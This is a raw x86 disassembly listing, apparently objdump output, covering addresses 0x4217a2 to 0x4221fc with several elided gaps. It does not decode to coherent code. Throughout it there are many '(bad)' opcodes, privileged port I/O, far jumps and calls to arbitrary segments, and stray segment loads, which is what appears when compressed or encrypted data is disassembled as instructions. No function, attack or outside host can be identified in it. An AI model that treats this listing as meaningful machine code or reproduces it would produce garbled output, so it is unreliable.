  4217a2:	test   al,0x8c
  4217a4:	mov    edx,0x5aac45e1
  4217a9:	mov    ah,BYTE PTR [ebx]
  4217ab:	mov    ecx,0x380bc87b
  4217b0:	daa    
  4217b1:	dec    esi
  4217b2:	mov    dl,dh
  4217b4:	sbb    al,0xcf
  4217b6:	mov    fs,WORD PTR [esp+eiz*8]
  4217b9:	std    
  4217ba:	enter  0x59e5,0x2
  4217be:	clc    
  4217bf:	dec    ebx
  4217c0:	cmp    al,0x9a
  4217c2:	shl    BYTE PTR [edx+ebp*4-0x76],0x9b
  4217c7:	push   DWORD PTR [ebx+eiz*1-0x1e]
  4217cb:	stos   BYTE PTR es:[edi],al
  4217cc:	and    al,0x4f
  4217ce:	xchg   ebx,eax
  4217cf:	cmp    cl,BYTE PTR ds:[ebx]
  4217d2:	nop
  4217d3:	pusha  
  4217d4:	jle    0x421801
  4217d6:	jns    0x4217ee
  4217d8:	pop    ecx
  4217d9:	mov    WORD PTR [eax+0x78436f51],fs
  4217df:	call   0x45c54308
  4217e4:	inc    edi
  4217e5:	jge    0x4217e4
  4217e7:	shr    BYTE PTR [ecx-0x1e],0xee
  4217eb:	sub    BYTE PTR [edx],0x69
  4217ee:	xchg   ecx,eax
  4217ef:	fwait
  4217f0:	or     al,0x1b
  4217f2:	xor    bl,bh
  4217f4:	(bad)  
  4217f5:	jb     0x421802
  4217f7:	call   0x97373722
  4217fc:	jnp    0x421816
  4217fe:	dec    eax
  4217ff:	adc    DWORD PTR [ecx-0x73762603],edi
  421805:	mov    esi,0x89ef21e1
  42180a:	cld    
  42180b:	daa    
  42180c:	in     al,0x56
  42180e:	sub    ebp,ecx
  421810:	test   BYTE PTR [ebx+0x19],al
  421813:	in     al,dx
  421814:	aam    0x81
  421816:	repnz fisub DWORD PTR [ebp-0x6d]
  42181a:	add    eax,0x48d67441
  42181f:	xor    BYTE PTR [esi*4-0x9e925aa],bh
  421826:	shl    bh,cl
  421828:	push   eax
  421829:	lock mov DWORD PTR [edx],edi
  42182c:	mov    esp,0x90a8e3f0
  421831:	cwde   
  421832:	pop    ebx
  421833:	pop    ds
  421834:	mov    BYTE PTR [ecx+0x66],ah
  421837:	test   BYTE PTR [eax+0x764e67bb],dh
  42183d:	std    
  42183e:	pop    edi
  42183f:	mov    ecx,DWORD PTR [eax+0x1d21816]
  421845:	jl     0x42181a
  421847:	jmp    0x3528:0xe914c20d
  42184e:	and    DWORD PTR [esi],ebp
  421850:	retf   0x155e
  421853:	sti    
  421854:	jp     0x4217e4
  421856:	xchg   esp,eax
  421857:	jecxz  0x421887
  421859:	mov    esp,0x4818a996
  42185e:	inc    esi
  42185f:	les    ebx,FWORD PTR [eax]
  421861:	add    ebx,DWORD PTR [esi+eax*4-0x2a229848]
  421868:	add    al,0xb7
  42186a:	cli    
  42186b:	clc    
  42186c:	push   es
	...
  4218d5:	add    cl,dl
  4218d7:	mov    al,ds:0xf9f9e0b9
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	jl     0x421864
  4218e4:	aaa    
  4218e5:	or     dh,dl
  4218e7:	add    DWORD PTR [bx+si],eax
  4218ea:	inc    DWORD PTR [eax]
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	mov    bh,0x38
  4218f0:	adc    eax,0xa9bab9b3
  4218f5:	idiv   bl
  4218f7:	fnsave [edx+0x453cf188]
  4218fd:	jecxz  0x4218be
  4218ff:	lods   eax,DWORD PTR ds:[esi]
  421900:	inc    eax
  421901:	cs in  al,0x9f
  421904:	mov    DWORD PTR ds:0xf9238528,edi
  42190a:	dec    eax
  42190b:	mov    bh,0x39
  42190d:	or     al,bh
  42190f:	mov    WORD PTR [ecx],ds
  421911:	fdiv   DWORD PTR [edx+0x70]
  421914:	mov    eax,DWORD PTR [edi+edx*4]
  421917:	inc    edx
  421918:	in     eax,0xb7
  42191a:	dec    esi
  42191b:	pop    ebx
  42191c:	xlat   BYTE PTR ds:[ebx]
  42191d:	sub    bl,BYTE PTR [edi+0x16]
  421920:	sti    
  421921:	or     edx,eax
  421923:	sub    DWORD PTR [esp+esi*1],eax
  421926:	dec    edx
  421927:	xor    eax,0xf86a8a97
  42192c:	shl    ebp,cl
  42192e:	pop    ebx
  42192f:	iret   
  421930:	mov    ebx,0x9af4f615
  421935:	mov    edx,0xc00bca67
  42193a:	bound  esp,QWORD PTR [esi+esi*2]
  42193d:	ret    0x319b
  421940:	clc    
  421941:	dec    edx
  421942:	outs   dx,DWORD PTR ds:[esi]
  421943:	cmp    ecx,DWORD PTR [esi]
  421945:	inc    edi
  421946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421947:	pop    eax
  421948:	pop    es
  421949:	mov    esp,DWORD PTR [edx]
  42194b:	fmul   QWORD PTR [eax+0x77]
  42194e:	fwait
  42194f:	adc    ecx,DWORD PTR [ecx]
  421951:	icebp  
  421952:	push   esp
  421953:	sbb    al,0x2
  421955:	and    bl,bh
  421957:	dec    edx
  421958:	jne    0x42198c
  42195a:	push   ds
  42195b:	fistp  WORD PTR [edi+ecx*8-0x2]
  42195f:	mov    ?,WORD PTR [eax+0x75]
  421962:	cdq    
  421963:	mov    dl,0xbb
  421965:	push   ecx
  421966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421967:	es dec ebx
  421969:	jle    0x4219c2
  42196b:	adc    DWORD PTR [ebx-0x6b7fbf4d],eax
  421971:	bound  ebx,QWORD PTR [ebp+0x43576138]
  421977:	and    DWORD PTR [eax-0x15ffd243],0x23fa3cf6
  421981:	xor    DWORD PTR [eax],eax
  421983:	push   ss
  421984:	arpl   WORD PTR [ecx+0x58e45b31],dx
  42198a:	mov    ch,cl
  42198c:	nop
  42198d:	pop    ds
  42198e:	xor    DWORD PTR [eax+0x7a6e4ad3],esi
  421994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421995:	repnz (bad) 
  421997:	lods   al,BYTE PTR ds:[esi]
  421998:	loope  0x4219fc
  42199a:	cmp    BYTE PTR [edx],dh
  42199c:	clc    
  42199d:	sbb    bh,BYTE PTR [esi]
  42199f:	mov    cl,0x68
  4219a1:	add    al,0x9b
  4219a3:	mov    edx,DWORD PTR [ecx]
  4219a5:	leave  
  4219a6:	inc    eax
  4219a7:	or     BYTE PTR ds:0x3dc0c43,0x3c
  4219ae:	dec    eax
  4219af:	outs   dx,BYTE PTR ds:[esi]
  4219b0:	ret    0xe328
  4219b3:	lods   eax,DWORD PTR ds:[esi]
  4219b4:	add    DWORD PTR [ecx],ebp
  4219b6:	or     dl,BYTE PTR [ebx-0x197a997b]
  4219bc:	xchg   BYTE PTR [eax],cl
  4219be:	fistp  WORD PTR [eax]
  4219c0:	(bad)  
  4219c1:	lods   al,BYTE PTR ds:[esi]
  4219c2:	and    ebp,DWORD PTR [ebx]
  4219c4:	ffree  st(4)
  4219c6:	push   0xffffffc6
  4219c8:	ror    BYTE PTR [ebp-0x74],cl
  4219cb:	push   edx
  4219cc:	mov    eax,0x4b16fe19
  4219d1:	sub    esi,ecx
  4219d3:	lock jmp 0x421a19
  4219d6:	or     ebp,DWORD PTR [eax-0x288688eb]
  4219dc:	mul    dl
  4219de:	add    bl,BYTE PTR [esi]
  4219e0:	arpl   WORD PTR [ebx-0x3c],bx
  4219e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219e4:	mov    bh,0x1
  4219e6:	pop    edi
  4219e7:	mov    al,0xf9
  4219e9:	push   0xffffff99
  4219eb:	inc    eax
  4219ec:	fild   DWORD PTR [eax]
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	inc    esp
  421a63:	mov    edi,0x168d5df
  421a69:	add    bh,bh
  421a6b:	add    BYTE PTR [eax],al
  421a6d:	add    BYTE PTR [ebp+0x469a1393],bh
  421a73:	pushf  
  421a74:	sbb    ecx,DWORD PTR [edx+edx*4-0x67e6c828]
  421a7b:	sbb    eax,DWORD PTR [esp+edx*4-0x12c9ad25]
  421a82:	mov    dl,0xa0
  421a84:	jmp    0x421a1a
  421a86:	iret   
  421a87:	test   eax,0x17c6ea14
  421a8c:	or     BYTE PTR [ebx],0x6d
  421a8f:	loop   0x421a23
  421a91:	push   es
  421a92:	test   DWORD PTR [ebx+0x6],0x2a76475a
  421a99:	adc    BYTE PTR ds:0x6ed75c33,ah
  421a9f:	sbb    bh,BYTE PTR [ecx+edx*1-0x7434c16f]
  421aa6:	fld    TBYTE PTR [esi]
  421aa8:	int    0xbb
  421aaa:	loope  0x421a93
  421aac:	js     0x421afb
  421aae:	nop
  421aaf:	fdiv   QWORD PTR [edi+0x4c]
  421ab2:	or     ebx,DWORD PTR [edi-0x46]
  421ab5:	call   0xafb34ae5
  421aba:	push   edx
  421abb:	in     eax,0x7f
  421abd:	outs   dx,BYTE PTR ds:[esi]
  421abe:	pop    esp
  421abf:	in     eax,dx
  421ac0:	shr    BYTE PTR [ecx-0x4b],1
  421ac3:	mov    bl,0xf6
  421ac5:	mov    al,0xca
  421ac7:	cmp    al,0x8c
  421ac9:	cmp    ebx,DWORD PTR [esi+0x18cbed3a]
  421acf:	(bad)  
  421ad0:	iret   
  421ad1:	(bad)  [ebx]
  421ad3:	into   
  421ad4:	dec    ecx
  421ad5:	in     eax,0x2
  421ad7:	fimul  WORD PTR [edx]
  421ad9:	aaa    
  421ada:	(bad)  
  421adb:	enter  0x885d,0x6d
  421adf:	inc    ebx
  421ae0:	jp     0x421ac6
  421ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ae3:	aas    
  421ae4:	outs   dx,DWORD PTR ds:[esi]
  421ae5:	pop    es
  421ae6:	add    ebx,DWORD PTR [edx]
  421ae8:	sub    al,0x7c
  421aea:	pop    ebp
  421aeb:	in     eax,dx
  421aec:	call   0x7d45:0xa27898a1
  421af3:	repnz inc esi
  421af5:	out    0x11,al
  421af7:	sahf   
  421af8:	jo     0x421b63
  421afa:	push   eax
  421afb:	mov    cl,0x1b
  421afd:	pop    ebp
  421afe:	jmp    esi
  421b00:	add    eax,0x1cc232ee
  421b05:	adc    ebp,DWORD PTR [ebx+0x3c]
  421b08:	xchg   edi,eax
  421b09:	dec    ebp
  421b0a:	retf   
  421b0b:	enter  0xbf4c,0x71
  421b0f:	pop    ss
  421b10:	adc    BYTE PTR [edi-0x3d],ch
  421b13:	repz (bad) 
  421b15:	das    
  421b16:	fisttp DWORD PTR [esi]
  421b18:	nop
  421b19:	daa    
  421b1a:	xchg   ecx,eax
  421b1b:	cmp    al,0x49
  421b1d:	jae    0x421b77
  421b1f:	rol    BYTE PTR [eax],0x20
  421b22:	add    eax,0x54ea30
  421b27:	sbb    bl,BYTE PTR [ebx]
  421b29:	in     al,0xe6
  421b2b:	into   
  421b2c:	sbb    BYTE PTR [ebx],0xd2
  421b2f:	retf   
  421b30:	sti    
  421b31:	fs mov dl,0xe4
  421b34:	sub    BYTE PTR [edx],cl
  421b36:	jnp    0x421b5c
  421b38:	mov    ds:0x9a0c12be,al
  421b3d:	out    0x1c,al
  421b3f:	call   0x99a6:0xb99d6db2
  421b46:	std    
  421b47:	add    BYTE PTR [ebx+0x57146636],0xb1
  421b4e:	jg     0x421b1a
  421b50:	imul   eax,DWORD PTR [eax],0xffffffbc
  421b53:	add    bl,bh
  421b55:	fadd   QWORD PTR [edi-0x6a3a0864]
  421b5b:	cld    
  421b5c:	mov    dh,0xbe
  421b5e:	cld    
  421b5f:	inc    ecx
  421b60:	jmp    0xded3250b
  421b65:	xchg   ebp,eax
  421b66:	mov    eax,ds:0x8c979fe8
  421b6b:	das    
  421b6c:	sbb    al,0x0
	...
  421bd6:	push   ss
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     al,BYTE PTR [esp+0x69d44bef]
  421be8:	add    DWORD PTR [eax],eax
  421bea:	inc    DWORD PTR [eax]
  421bec:	add    BYTE PTR [eax],al
  421bee:	pusha  
  421bef:	(bad)  
  421bf0:	outs   dx,DWORD PTR ds:[esi]
  421bf1:	sub    BYTE PTR ds:0xb6a3e872,ch
  421bf7:	into   
  421bf8:	mov    bl,0x58
  421bfa:	fsubp  st(6),st
  421bfc:	pop    esp
  421bfd:	and    al,0x3b
  421bff:	mov    bl,0xd9
  421c01:	mov    bh,0x8a
  421c03:	mov    ch,BYTE PTR [esi]
  421c05:	and    bh,bl
  421c07:	push   ss
  421c08:	push   ecx
  421c09:	sub    al,0x99
  421c0b:	xchg   esi,eax
  421c0c:	and    BYTE PTR [ecx+0x6a],ch
  421c0f:	inc    esp
  421c10:	fwait
  421c11:	cwde   
  421c12:	mov    esi,0x4f4f814d
  421c17:	jae    0x421bee
  421c19:	pop    ss
  421c1a:	jecxz  0x421bca
  421c1c:	xor    al,0x49
  421c1e:	lods   eax,DWORD PTR ds:[esi]
  421c1f:	push   ecx
  421c20:	rcl    BYTE PTR [ebp+0x44],cl
  421c23:	mov    BYTE PTR [edx+0x6],dh
  421c26:	pop    edi
  421c27:	imul   edx,ecx,0x1f42cade
  421c2d:	sahf   
  421c2e:	mov    eax,0x110e54fb
  421c33:	dec    edi
  421c34:	inc    edi
  421c35:	fwait
  421c36:	stos   BYTE PTR es:[edi],al
  421c37:	jp     0x421c56
  421c39:	add    DWORD PTR [eax],esp
  421c3b:	push   ebp
  421c3c:	arpl   WORD PTR [edx],dx
  421c3e:	outs   dx,DWORD PTR ds:[esi]
  421c3f:	inc    ebp
  421c40:	jmp    0x9b3d:0x57147768
  421c47:	push   ebp
  421c48:	fimul  WORD PTR [edi-0x261bbafd]
  421c4e:	aaa    
  421c4f:	iret   
  421c50:	popf   
  421c51:	(bad)  
  421c52:	xchg   edi,eax
  421c53:	mov    ebp,0xbdb38b7a
  421c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c59:	jmp    0x3ae4:0x59b0858b
  421c60:	cdq    
  421c61:	repnz or eax,0xde3cf75c
  421c67:	xor    BYTE PTR [edi-0x50],bh
  421c6a:	push   ecx
  421c6b:	sub    al,0xaf
  421c6d:	jmp    0x85a77617
  421c72:	in     al,0x7d
  421c74:	sub    BYTE PTR [ecx-0x4a],bl
  421c77:	mov    bh,dl
  421c79:	pop    esi
  421c7a:	in     al,dx
  421c7b:	int3   
  421c7c:	mov    edx,0x79475112
  421c81:	cmp    eax,0x6898edc1
  421c86:	dec    esi
  421c87:	fiadd  WORD PTR [ebp-0x5cfe0d9e]
  421c8d:	mov    esp,0xdcef464a
  421c92:	cmp    ah,BYTE PTR [ebx]
  421c94:	lea    ecx,[edx]
  421c96:	mov    ds:0xbd5a2a03,al
  421c9b:	call   0xeef6150a
  421ca0:	jns    0x421cb6
  421ca2:	loope  0x421c81
  421ca4:	cs pop ecx
  421ca6:	arpl   WORD PTR [esi],ax
  421ca8:	aam    0x37
  421caa:	jmp    0x421c48
  421cac:	retf   
  421cad:	pop    edi
  421cae:	int3   
  421caf:	mov    gs,WORD PTR [edi]
  421cb1:	jge    0x421d20
  421cb3:	inc    BYTE PTR [ebp-0x4546c17]
  421cb9:	pop    edx
  421cba:	inc    ebx
  421cbb:	lea    edi,[edi+eax*1]
  421cbe:	into   
  421cbf:	ficom  DWORD PTR [eax+edi*4+0x55b13a5]
  421cc6:	xor    al,BYTE PTR [esi+0x26]
  421cc9:	jecxz  0x421d0a
  421ccb:	sbb    al,BYTE PTR [ebx]
  421ccd:	pop    esp
  421cce:	push   edi
  421ccf:	push   ebx
  421cd0:	or     al,0xd6
  421cd2:	mov    ecx,0x1b76c26d
  421cd7:	mov    esp,0xe23ddc5a
  421cdc:	fdiv   QWORD PTR [edi+0x3dc0a24a]
  421ce2:	add    bl,BYTE PTR [ebx-0x15]
  421ce5:	mov    edx,0xb993bbba
  421cea:	xchg   esp,eax
  421ceb:	jmp    0x421d2f
	...
  421d54:	add    BYTE PTR [eax],al
  421d56:	mov    al,0x6b
  421d58:	mov    ch,0xe5
  421d5a:	(bad)  
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	cmp    bh,BYTE PTR [esi-0x4]
  421d65:	in     eax,dx
  421d66:	shr    DWORD PTR [edx+0x1],cl
  421d69:	add    bh,bh
  421d6b:	add    BYTE PTR [eax],al
  421d6d:	add    dh,bl
  421d6f:	add    al,0xcf
  421d71:	(bad)  
  421d73:	stos   BYTE PTR es:[edi],al
  421d74:	adc    ecx,DWORD PTR [ebx]
  421d76:	pop    ebp
  421d77:	fst    DWORD PTR [eax+edx*2-0x7377a72d]
  421d7e:	hlt    
  421d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d80:	(bad)  
  421d81:	aas    
  421d82:	addr16 test bh,al
  421d85:	jle    0x421dc7
  421d87:	jmp    0x66f8:0x58a2024e
  421d8e:	and    al,0xbb
  421d90:	icebp  
  421d91:	mov    bl,0xc9
  421d93:	popf   
  421d94:	das    
  421d95:	dec    esi
  421d96:	jmp    0xeadb:0xf8438ae
  421d9d:	xor    dl,dl
  421d9f:	cmp    DWORD PTR ds:0xd60292f8,0x8b31c1e3
  421da9:	scas   al,BYTE PTR es:[edi]
  421daa:	ins    DWORD PTR es:[edi],dx
  421dab:	xchg   edi,eax
  421dac:	into   
  421dad:	mov    eax,0x1e5d8195
  421db2:	dec    eax
  421db3:	hlt    
  421db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421db5:	test   BYTE PTR [esi+0x2e736dec],cl
  421dbb:	add    edi,eax
  421dbd:	and    bl,dh
  421dbf:	pushf  
  421dc0:	(bad)  
  421dc1:	outs   dx,BYTE PTR ds:[esi]
  421dc2:	mov    ecx,0xa4b166c9
  421dc7:	dec    esp
  421dc8:	js     0x421da8
  421dca:	mov    edi,DWORD PTR [eax]
  421dcc:	dec    edx
  421dcd:	out    dx,eax
  421dce:	and    ecx,DWORD PTR [edx]
  421dd0:	xor    edx,edx
  421dd2:	pushf  
  421dd3:	mov    al,0xcb
  421dd5:	dec    edx
  421dd6:	pusha  
  421dd7:	xor    ebp,DWORD PTR [esi+0x5c]
  421dda:	rol    DWORD PTR [eax],1
  421ddc:	sbb    edx,DWORD PTR [edx+0x6e89fc20]
  421de2:	cli    
  421de3:	sub    BYTE PTR [eax-0x5071ecc4],al
  421de9:	test   al,0xb8
  421deb:	cld    
  421dec:	add    ch,BYTE PTR [ebx+0x68b480c8]
  421df2:	add    eax,DWORD PTR [ebx-0x51]
  421df5:	(bad)  
  421df6:	push   ds
  421df7:	data16 lock add cl,BYTE PTR [edi+ebx*8]
  421dfc:	dec    ebp
  421dfd:	mov    WORD PTR [edi-0x4b],ss
  421e00:	enter  0x327a,0x86
  421e04:	push   ebp
  421e05:	stos   BYTE PTR es:[edi],al
  421e06:	cwde   
  421e07:	and    DWORD PTR [ebx+0x2cb75bfb],eax
  421e0d:	push   es
  421e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e0f:	dec    esp
  421e10:	mov    ds:0x2b48c073,eax
  421e15:	push   ebx
  421e16:	les    esp,FWORD PTR [eax]
  421e18:	add    al,0xff
  421e1a:	(bad)
  421e1e:	mov    ebx,0x31c8ab71
  421e23:	in     eax,dx
  421e24:	or     ch,bl
  421e26:	sbb    edi,DWORD PTR [esi+0x55]
  421e29:	fisub  DWORD PTR [eax+ebp*8]
  421e2c:	outs   dx,DWORD PTR ds:[esi]
  421e2d:	mov    edx,0x720bf4fd
  421e32:	pop    edx
  421e33:	push   ebx
  421e34:	rol    BYTE PTR [ebx-0x25],cl
  421e37:	mov    eax,0x732b2f8d
  421e3c:	retf   0x92ec
  421e3f:	hlt    
  421e40:	rcr    ah,1
  421e42:	das    
  421e43:	aam    0x1e
  421e45:	sub    cl,BYTE PTR [esp+ebx*1]
  421e48:	scas   eax,DWORD PTR es:[edi]
  421e49:	sbb    al,0x2
  421e4b:	int    0x23
  421e4d:	mov    bh,0xb6
  421e4f:	mov    WORD PTR [edi+0x45],ds
  421e52:	mov    edx,0xa8c65c2d
  421e57:	js     0x421ea9
  421e59:	xchg   esp,eax
  421e5a:	mov    ebp,0x9d636905
  421e5f:	adc    ecx,DWORD PTR [edi-0xa0e638c]
  421e65:	mov    dh,0x85
  421e67:	jg     0x421e09
  421e69:	sub    eax,0xed4661
	...
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	xor    DWORD PTR [edx],edx
  421ee4:	mov    bl,0x82
  421ee6:	shr    BYTE PTR [ebx+0x1],cl
  421ee9:	add    bh,bh
  421eeb:	add    BYTE PTR [eax],al
  421eed:	add    BYTE PTR [edx],cl
  421eef:	cmp    eax,DWORD PTR [ebp+ecx*4+0x76]
  421ef3:	push   eax
  421ef4:	mov    ds:0x166fe380,al
  421ef9:	daa    
  421efa:	pop    eax
  421efb:	stc    
  421efc:	outs   dx,BYTE PTR ds:[esi]
  421efd:	or     ebp,DWORD PTR [ebx]
  421eff:	(bad)  
  421f00:	dec    esp
  421f01:	and    BYTE PTR [edi-0x2275d7f1],al
  421f07:	ja     0x421f1a
  421f09:	icebp  
  421f0a:	shr    BYTE PTR [esi],cl
  421f0c:	or     ah,BYTE PTR [ecx-0x2b5f323]
  421f12:	aad    0x4
  421f14:	mov    BYTE PTR [edx+0x24782b4f],bh
  421f1a:	pop    eax
  421f1b:	and    BYTE PTR [esi-0x46],bl
  421f1e:	and    DWORD PTR [edi],esp
  421f20:	dec    eax
  421f21:	mov    ebp,0x407315fc
  421f26:	stos   DWORD PTR es:[edi],eax
  421f27:	test   DWORD PTR [ecx-0x6],esi
  421f2a:	dec    edx
  421f2b:	jp     0x421f39
  421f2d:	(bad)  
  421f2e:	or     al,0x6e
  421f30:	dec    esi
  421f31:	ret    0x29cf
  421f34:	adc    ah,BYTE PTR [ebx]
  421f36:	jbe    0x421f40
  421f38:	xchg   ebp,eax
  421f39:	iret   
  421f3a:	add    al,0x86
  421f3c:	mov    WORD PTR [edi+eax*8],?
  421f3f:	mov    bh,0xc3
  421f41:	dec    ebx
  421f42:	out    dx,al
  421f43:	retf   0x4162
  421f46:	and    BYTE PTR [ebx+0x2297ea8c],cl
  421f4c:	pop    es
  421f4d:	jmp    DWORD PTR [eax+0x59]
  421f50:	dec    esi
  421f51:	mov    bh,al
  421f53:	adc    al,0x82
  421f55:	mov    ds:0xf3e417fd,eax
  421f5a:	fiadd  DWORD PTR [eax+0x7f]
  421f5d:	and    BYTE PTR [edi+ebp*1-0x50],al
  421f61:	push   es
  421f62:	scas   al,BYTE PTR es:[edi]
  421f63:	mov    eax,ds:0x7b1d16c7
  421f68:	cmp    ecx,edi
  421f6a:	out    dx,al
  421f6b:	hlt    
  421f6c:	and    DWORD PTR [ebp+0x168c2ce6],ebx
  421f72:	mov    al,0xb1
  421f74:	push   edi
  421f75:	jnp    0x421f6b
  421f77:	adc    eax,0xe88b20de
  421f7c:	push   ebx
  421f7d:	cmp    bh,BYTE PTR [esp+esi*2+0x12]
  421f81:	pop    esi
  421f82:	xchg   esi,eax
  421f83:	mov    ecx,0x625f5f68
  421f88:	dec    ebx
  421f89:	inc    esi
  421f8a:	cmp    esi,esp
  421f8c:	repz out dx,eax
  421f8e:	or     BYTE PTR [edi+0x73c9fbd6],0x80
  421f95:	retf   0xa34a
  421f98:	mov    ds:0x36b870c7,eax
  421f9d:	jnp    0x421fcd
  421f9f:	sub    ch,BYTE PTR [ebx-0x5afa6511]
  421fa5:	(bad)  
  421fa6:	enter  0x1571,0xe4
  421faa:	sbb    BYTE PTR [eax-0x7926819d],ch
  421fb0:	ror    BYTE PTR [edx-0x42],0x1a
  421fb4:	dec    ebp
  421fb5:	sub    ebx,DWORD PTR [esi-0x6a]
  421fb8:	les    ebp,FWORD PTR [edx+0xe390539]
  421fbe:	repnz loope 0x421fdc
  421fc1:	jp     0x421f9b
  421fc3:	icebp  
  421fc4:	cmp    ebp,esi
  421fc6:	test   al,0xc8
  421fc8:	pop    ebp
  421fc9:	jno    0x421f7d
  421fcb:	ret    0x6d83
  421fce:	jbe    0x42201c
  421fd0:	bound  ebp,QWORD PTR [ebx+0x5a14e669]
  421fd6:	add    bl,BYTE PTR [edi]
  421fd8:	jae    0x421f83
  421fda:	cdq    
  421fdb:	jmp    0x422007
  421fdd:	add    DWORD PTR [edx+0x42],ebx
  421fe0:	arpl   WORD PTR [esi],si
  421fe2:	push   edx
  421fe3:	sahf   
  421fe4:	out    dx,al
  421fe5:	dec    eax
  421fe6:	mov    DWORD PTR [edi+0x594f9beb],edi
  421fec:	rol    BYTE PTR [eax],1
	...
  422056:	imul   eax,DWORD PTR [esi],0xffffff8f
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	data16 sahf 
  422063:	stos   BYTE PTR es:[edi],al
  422064:	add    DWORD PTR [ecx+edx*8],0xff00016c
  42206b:	add    BYTE PTR [eax],al
  42206d:	add    BYTE PTR [ecx+0x4d],ah
  422070:	push   esp
  422071:	ret    0x757a
  422074:	mov    edx,0xb514ab3
  422079:	(bad)  
  42207a:	pusha  
  42207b:	push   esp
  42207c:	mov    DWORD PTR [ebp-0x46f50478],eax
  422082:	(bad)  
  422083:	inc    edi
  422084:	jecxz  0x42203e
  422086:	loope  0x422029
  422088:	into   
  422089:	lock jb 0x42205c
  42208c:	xchg   esi,eax
  42208d:	addr16 cdq 
  42208f:	call   0xfcdccc45
  422094:	aas    
  422095:	rcr    DWORD PTR [edi-0x67],0xfa
  422099:	xchg   edi,eax
  42209a:	imul   ebx,DWORD PTR [edi+edi*1+0x5d],0xffffff8b
  42209f:	add    eax,0xb5e014ae
  4220a4:	into   
  4220a5:	out    0xd9,eax
  4220a7:	pop    es
  4220a8:	pusha  
  4220a9:	jecxz  0x42205f
  4220ab:	mov    gs,WORD PTR [ecx-0x37]
  4220ae:	dec    ebp
  4220af:	sahf   
  4220b0:	aam    0x25
  4220b2:	xor    DWORD PTR fs:[edi],ebx
  4220b5:	jno    0x422131
  4220b7:	jge    0x4220e5
  4220b9:	add    al,0x3e
  4220bb:	mov    bh,0xe6
  4220bd:	shl    BYTE PTR ds:0xdb16a050,0xa9
  4220c4:	and    eax,DWORD PTR [ebp-0x6a]
  4220c7:	shr    eax,0x80
  4220ca:	loope  0x4220b8
  4220cc:	jns    0x4220dd
  4220ce:	inc    ebp
  4220cf:	sbb    ebx,DWORD PTR ds:0xc8539406
  4220d5:	test   BYTE PTR [edi-0x2183512],bl
  4220db:	sbb    DWORD PTR [ecx-0x21],esp
  4220de:	mov    al,0x7a
  4220e0:	(bad)  
  4220e1:	jae    0x42215b
  4220e3:	sbb    BYTE PTR [ebx+0x1470e21d],al
  4220e9:	rol    BYTE PTR [esi+0x41868b1a],1
  4220ef:	dec    edi
  4220f0:	jae    0x422108
  4220f2:	sub    BYTE PTR [eax+0xda553c9],ch
  4220f8:	jbe    0x4220e1
  4220fa:	iret   
  4220fb:	jle    0x4220ad
  4220fd:	bound  ebp,QWORD PTR [ecx-0x7c]
  422100:	imul   edx,DWORD PTR [eax],0xf0d39791
  422106:	fisubr WORD PTR [ebp+0x7c847c0c]
  42210c:	inc    edx
  42210d:	or     al,0xf4
  42210f:	outs   dx,DWORD PTR ds:[esi]
  422110:	aam    0x3f
  422112:	or     ebp,DWORD PTR [ecx-0x64a8dc79]
  422118:	test   al,0x30
  42211a:	test   DWORD PTR [esi+0x62127c18],ebp
  422120:	pop    eax
  422121:	call   0x65cb:0x67ed093d
  422128:	and    edi,edi
  42212a:	shr    BYTE PTR [edi+0x7bd4ead4],cl
  422130:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  422132:	ret    0x96e7
  422135:	xchg   edx,eax
  422136:	dec    edi
  422137:	jmp    eax
  422139:	sub    eax,0xb796138e
  42213e:	sbb    eax,DWORD PTR [ebp+0x5c]
  422141:	cmp    al,0xa0
  422143:	jl     0x4220e3
  422145:	xor    DWORD PTR [esi-0xeb4df72],edx
  42214b:	adc    ebx,edx
  42214d:	sbb    al,0x22
  42214f:	cli    
  422150:	mov    ds:0xb566fe72,al
  422155:	sar    BYTE PTR [edx+0x17],1
  422158:	adc    al,0x26
  42215a:	cwde   
  42215b:	mov    ch,0xda
  42215d:	xchg   esi,eax
  42215e:	ds in  eax,0xc2
  422161:	das    
  422162:	jmp    0x4221b4
  422164:	add    dl,BYTE PTR [esp+ebx*4]
  422167:	push   0x2f
  422169:	xor    al,0xfe
  42216b:	dec    eax
  42216c:	push   ds
	...
  4221d5:	add    BYTE PTR [esi-0x284ae],ah
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    esp,DWORD PTR [ebp-0x2f7cfac4]
  4221e7:	ins    DWORD PTR es:[edi],dx
  4221e8:	add    DWORD PTR [eax],eax
  4221ea:	inc    DWORD PTR [eax]
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	mul    DWORD PTR [ebx]
  4221f0:	pop    eax
  4221f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221f2:	xor    eax,0x376abb31
  4221f7:	sub    eax,0xfbe70aaf
  4221fc:	test   BYTE PTR [esi],0xe6
